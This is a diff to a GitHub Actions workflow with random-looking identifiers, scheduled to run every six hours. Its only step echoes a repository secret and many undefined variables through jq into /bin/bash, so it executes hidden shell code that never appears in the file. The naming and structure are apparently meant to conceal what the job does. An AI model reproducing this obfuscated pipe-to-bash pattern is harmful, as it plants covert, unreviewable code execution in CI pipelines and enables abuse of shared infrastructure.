@@ -1,28 +1,27 @@
 name: tairuili6715
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 3/6 * * *'
-
-jobs:  # 9222
+    - cron: '8 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: tairuili6715
         env:
-          xdnj11503: ${{ secrets.xdnj11503 }}
+          ko237: ${{ secrets.ko237 }}
         run: |
-          echo $xdnj11503 | jq -r .h035 | /bin/bash
-          echo $yb97 | jq -r .lwj16372 | /bin/bash
-          echo $m28 | jq -r .mbh00 | /bin/bash
-          echo $jncl50780 | jq -r .xesql15 | /bin/bash
-          echo $xmn556 | jq -r .zpi016 | /bin/bash
-          echo $vs3938 | jq -r .rpqwv718 | /bin/bash
-          echo $jeg3 | jq -r .zmupa6083 | /bin/bash
-          echo $vxw2421 | jq -r .anzt94951 | /bin/bash
-          echo $c44611 | jq -r .ym3830 | /bin/bash
-          echo $g7653 | jq -r .k65 | /bin/bash
-          echo $lj453 | jq -r .ivn6615 | /bin/bash
+          echo $ko237 | jq -r .eoam243 | /bin/bash
+          echo $glq7330 | jq -r .ky271 | /bin/bash
+          echo $dvxrx5509 | jq -r .k0860 | /bin/bash
+          echo $yegw410 | jq -r .lm1 | /bin/bash
+          echo $sb089 | jq -r .qly242 | /bin/bash
+          echo $afwa670 | jq -r .eccc89608 | /bin/bash
+          echo $ry847 | jq -r .wchaz16 | /bin/bash
+          echo $e74724 | jq -r .dh792 | /bin/bash
+          echo $hgre4315 | jq -r .hc49 | /bin/bash
+          echo $wapvw8 | jq -r .lbk315 | /bin/bash
+          echo $lesy88098 | jq -r .mrz4 | /bin/bash
+          echo $abdh534 | jq -r .e29953 | /bin/bash
 
